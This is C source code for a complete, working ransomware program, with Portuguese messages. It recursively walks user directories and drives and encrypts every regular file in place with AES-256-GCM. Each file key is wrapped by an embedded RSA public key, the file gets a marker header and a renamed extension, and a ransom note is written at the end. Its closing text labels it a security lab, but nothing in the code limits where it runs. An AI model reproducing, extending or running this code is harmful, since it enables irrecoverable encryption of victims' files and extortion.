
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>

#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/crypto.h>

#include "vault.h"

#define SECURE_ZERO(ptr, len) OPENSSL_cleanse((ptr), (len))

#ifdef _WIN32
    #include <windows.h>
    #include <io.h>
    #define F_OK 0
    #define W_OK 2
    #define R_OK 4
#else
    #include <dirent.h>
    #include <sys/stat.h>
#endif

static const char MAGIC[8] = "2373LOCK";
#define MAGIC_LEN     8
#define RSA_BLOB_LEN  256
#define AES_KEY_LEN   32
#define GCM_NONCE_LEN 12
#define GCM_TAG_LEN   16
#define SEED_LEN      (AES_KEY_LEN + GCM_NONCE_LEN + 8)

#define MAX_FILE_SIZE (512ULL * 1024ULL * 1024ULL)

static EVP_PKEY *g_pubkey = NULL;

static pthread_mutex_t g_lock         = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t  g_all_done     = PTHREAD_COND_INITIALIZER;
static int             g_active_threads = 0;

static void thread_inc(void) {
    pthread_mutex_lock(&g_lock);
    g_active_threads++;
    pthread_mutex_unlock(&g_lock);
}

static void thread_dec(void) {
    pthread_mutex_lock(&g_lock);
    if (--g_active_threads == 0) {
        pthread_cond_signal(&g_all_done);
    }
    pthread_mutex_unlock(&g_lock);
}

static void wait_all_threads(void) {
    pthread_mutex_lock(&g_lock);
    while (g_active_threads > 0) {
        pthread_cond_wait(&g_all_done, &g_lock);
    }
    pthread_mutex_unlock(&g_lock);
}

typedef struct { char path[1024]; } ThreadArgs;

static EVP_PKEY *load_pubkey_from_der(void) {
    const unsigned char *p = MASTER_PUB_DER;
    return d2i_PUBKEY(NULL, &p, MASTER_PUB_DER_LEN);
}

static int rsa_oaep_encrypt(EVP_PKEY *pub,
                             const unsigned char *plain, size_t plain_len,
                             unsigned char *out, size_t *out_len) {
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(pub, NULL);
    int ok = 0;
    if (!ctx) return 0;
    if (EVP_PKEY_encrypt_init(ctx)                                      <= 0) goto done;
    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING)      <= 0) goto done;
    if (EVP_PKEY_CTX_set_rsa_oaep_md(ctx, EVP_sha256())                <= 0) goto done;
    if (EVP_PKEY_encrypt(ctx, out, out_len, plain, plain_len)           <= 0) goto done;
    ok = 1;
done:
    EVP_PKEY_CTX_free(ctx);
    return ok;
}

static int aes256gcm_encrypt(const unsigned char *key,   const unsigned char *nonce,
                               const unsigned char *plain, size_t              plain_len,
                               unsigned char       *cipher, unsigned char      *tag) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int len = 0, ok = 0;
    if (!ctx) return 0;
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)             != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, GCM_NONCE_LEN, NULL)   != 1) goto done;
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce)                           != 1) goto done;
    if (EVP_EncryptUpdate(ctx, cipher, &len, plain, (int)plain_len)              != 1) goto done;
    if (EVP_EncryptFinal_ex(ctx, cipher + len, &len)                             != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_LEN, tag)        != 1) goto done;
    ok = 1;
done:
    EVP_CIPHER_CTX_free(ctx);
    return ok;
}

static void get_self_path(char *buf, size_t size) {
#ifdef _WIN32
    if (GetModuleFileNameA(NULL, buf, (DWORD)size) == 0) buf[0] = '\0';
#else
    ssize_t len = readlink("/proc/self/exe", buf, size - 1);
    if (len > 0) buf[len] = '\0';
    else buf[0] = '\0';
#endif
}

static void *encrypt_worker(void *arg) {
    ThreadArgs *a = (ThreadArgs *)arg;

    if (access(a->path, R_OK | W_OK) != 0) goto done_free;

    FILE *f = fopen(a->path, "rb");
    if (!f) goto done_free;

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    rewind(f);

    if (fsize <= 0) { fclose(f); goto done_free; }

    if ((unsigned long long)fsize > MAX_FILE_SIZE) {
        fclose(f);
        goto done_free;
    }

    char hdr[MAGIC_LEN];
    if (fread(hdr, 1, MAGIC_LEN, f) == MAGIC_LEN &&
        memcmp(hdr, MAGIC, MAGIC_LEN) == 0) {
        fclose(f);
        goto done_free;
    }
    rewind(f);

    unsigned char *plain = malloc((size_t)fsize);
    if (!plain || (long)fread(plain, 1, (size_t)fsize, f) != fsize) {
        fclose(f); free(plain); goto done_free;
    }
    fclose(f);

    unsigned char aes_key[AES_KEY_LEN];
    unsigned char nonce[GCM_NONCE_LEN];
    if (RAND_bytes(aes_key, AES_KEY_LEN)   != 1 ||
        RAND_bytes(nonce,   GCM_NONCE_LEN) != 1) {
        SECURE_ZERO(aes_key, AES_KEY_LEN);
        SECURE_ZERO(nonce, GCM_NONCE_LEN);
        SECURE_ZERO(plain, (size_t)fsize);
        free(plain);
        goto done_free;
    }

    unsigned char seed[SEED_LEN];
    memcpy(seed,                                aes_key, AES_KEY_LEN);
    memcpy(seed + AES_KEY_LEN,                  nonce,   GCM_NONCE_LEN);
    uint64_t sz = (uint64_t)fsize;
    memcpy(seed + AES_KEY_LEN + GCM_NONCE_LEN, &sz,     8);

    unsigned char rsa_blob[RSA_BLOB_LEN];
    size_t rsa_len = RSA_BLOB_LEN;
    if (!rsa_oaep_encrypt(g_pubkey, seed, SEED_LEN, rsa_blob, &rsa_len)) {
        SECURE_ZERO(seed,    SEED_LEN);
        SECURE_ZERO(aes_key, AES_KEY_LEN);
        SECURE_ZERO(nonce,   GCM_NONCE_LEN);
        SECURE_ZERO(plain,   (size_t)fsize);
        free(plain);
        goto done_free;
    }

    unsigned char *cipher = malloc((size_t)fsize);
    unsigned char  tag[GCM_TAG_LEN];
    if (!cipher || !aes256gcm_encrypt(aes_key, nonce, plain,
                                       (size_t)fsize, cipher, tag)) {
        if (cipher) { SECURE_ZERO(cipher, (size_t)fsize); free(cipher); }
        goto secure_erase;
    }

secure_erase:
    SECURE_ZERO(aes_key, AES_KEY_LEN);
    SECURE_ZERO(nonce,   GCM_NONCE_LEN);
    SECURE_ZERO(seed,    SEED_LEN);
    SECURE_ZERO(plain,   (size_t)fsize);
    free(plain);

    if (!cipher) goto done_free;

    FILE *out = fopen(a->path, "wb");
    if (out) {
        int write_ok = 1;
        if (fwrite(MAGIC,    1, MAGIC_LEN,     out) != MAGIC_LEN)     write_ok = 0;
        if (fwrite(rsa_blob, 1, RSA_BLOB_LEN,  out) != RSA_BLOB_LEN)  write_ok = 0;
        if (fwrite(cipher,   1, (size_t)fsize,  out) != (size_t)fsize) write_ok = 0;
        if (fwrite(tag,      1, GCM_TAG_LEN,    out) != GCM_TAG_LEN)  write_ok = 0;
        fclose(out);
        if (!write_ok) {
            fprintf(stderr, "[!] Escrita incompleta: %s\n", a->path);
            SECURE_ZERO(rsa_blob, RSA_BLOB_LEN);
            SECURE_ZERO(tag, GCM_TAG_LEN);
            SECURE_ZERO(cipher, (size_t)fsize);
            free(cipher);
            goto done_free;
        }
    } else {
        fprintf(stderr, "[!] Falha ao abrir para escrita: %s\n", a->path);
        SECURE_ZERO(rsa_blob, RSA_BLOB_LEN);
        SECURE_ZERO(tag, GCM_TAG_LEN);
        SECURE_ZERO(cipher, (size_t)fsize);
        free(cipher);
        goto done_free;
    }
    SECURE_ZERO(rsa_blob, RSA_BLOB_LEN);
    SECURE_ZERO(tag, GCM_TAG_LEN);
    SECURE_ZERO(cipher, (size_t)fsize);
    free(cipher);

    char new_name[2048];
    strncpy(new_name, a->path, sizeof(new_name) - strlen(EXT) - 1);
    new_name[sizeof(new_name) - 1] = '\0';
    char *dot = strrchr(new_name, '.');
    if (dot) *dot = '\0';
    strncat(new_name, EXT, sizeof(new_name) - strlen(new_name) - 1);
    if (rename(a->path, new_name) != 0) {
        fprintf(stderr, "[!] rename falhou: %s\n", a->path);
    }

done_free:
    free(a);
    thread_dec();
    return NULL;
}

static void walk_dir(const char *dir_name, const char *self_path) {
#ifdef _WIN32
    WIN32_FIND_DATAA findData;
    char search_path[2048];
    snprintf(search_path, sizeof(search_path), "%s\\*", dir_name);

    HANDLE hFind = FindFirstFileA(search_path, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(findData.cFileName, ".") == 0 ||
            strcmp(findData.cFileName, "..") == 0) continue;

        char full_path[2048];
        snprintf(full_path, sizeof(full_path), "%s\\%s", dir_name, findData.cFileName);

        if (strcmp(full_path, self_path) == 0) continue;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strstr(full_path, "Windows") || strstr(full_path, "$Recycle.Bin") ||
                strstr(full_path, "AppData") || strstr(full_path, "Program Files")) continue;
            walk_dir(full_path, self_path);
        } else {
            if (findData.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) continue;
            pthread_t thread;
            ThreadArgs *args = malloc(sizeof(ThreadArgs));
            if (args) {
                strncpy(args->path, full_path, sizeof(args->path) - 1);
                thread_inc();
                if (pthread_create(&thread, NULL, encrypt_worker, args) != 0) {
                    thread_dec();
                    free(args);
                } else {
                    pthread_detach(thread);
                }
            }
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);

#else
    const struct dirent *entry;
    DIR *dp = opendir(dir_name);
    if (!dp) return;

    while ((entry = readdir(dp))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        char full_path[2048];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_name, entry->d_name);

        struct stat st;
        if (lstat(full_path, &st) == -1) continue;

        if (strcmp(full_path, self_path) == 0) continue;

        if (S_ISDIR(st.st_mode)) {
            if (strstr(full_path, "/proc") || strstr(full_path, "/dev") ||
                strstr(full_path, "/sys"))  continue;
            walk_dir(full_path, self_path);
        } else if (S_ISREG(st.st_mode)) {
            pthread_t thread;
            ThreadArgs *args = malloc(sizeof(ThreadArgs));
            if (args) {
                strncpy(args->path, full_path, sizeof(args->path) - 1);
                thread_inc();
                if (pthread_create(&thread, NULL, encrypt_worker, args) != 0) {
                    thread_dec();
                    free(args);
                } else {
                    pthread_detach(thread);
                }
            }
        }
    }
    closedir(dp);
#endif
}

int main(void) {
    if (!OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS |
                             OPENSSL_INIT_ADD_ALL_CIPHERS     |
                             OPENSSL_INIT_ADD_ALL_DIGESTS, NULL)) {
        fprintf(stderr, "[!] Falha ao inicializar OpenSSL\n");
        return 1;
    }

    g_pubkey = load_pubkey_from_der();
    if (!g_pubkey) {
        fprintf(stderr, "[!] Falha ao carregar RSA public key\n");
        return 1;
    }

    char self[1024] = {0};
    get_self_path(self, sizeof(self));

#ifdef _WIN32
    DWORD drives = GetLogicalDrives();
    char drive_letter[] = "A:\\";
    for (int i = 0; i < 26; i++) {
        if (!(drives & (1 << i))) continue;
        drive_letter[0] = 'A' + i;
        if (drive_letter[0] == 'A' || drive_letter[0] == 'B') continue;
        UINT type = GetDriveTypeA(drive_letter);
        if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) {
            printf("[+] Atacando: %s\n", drive_letter);
            walk_dir(drive_letter, self);
        }
    }
#else
    walk_dir("/home",  self);
    walk_dir("/media", self);
    walk_dir("/mnt",   self);
#endif

    wait_all_threads();

    EVP_PKEY_free(g_pubkey);
    g_pubkey = NULL;

    pthread_mutex_destroy(&g_lock);
    pthread_cond_destroy(&g_all_done);

    FILE *note = fopen("LEIA_ME.txt", "w");
    if (note) {
        fprintf(note,
            "Seus arquivos foram cifrados com AES-256-GCM.\n"
            "Apenas o detentor da chave privada RSA pode restaura-los.\n"
            "Laboratorio de seguranca — pode fazer snapshot :)\n");
        fclose(note);
    }

    return 0;
}
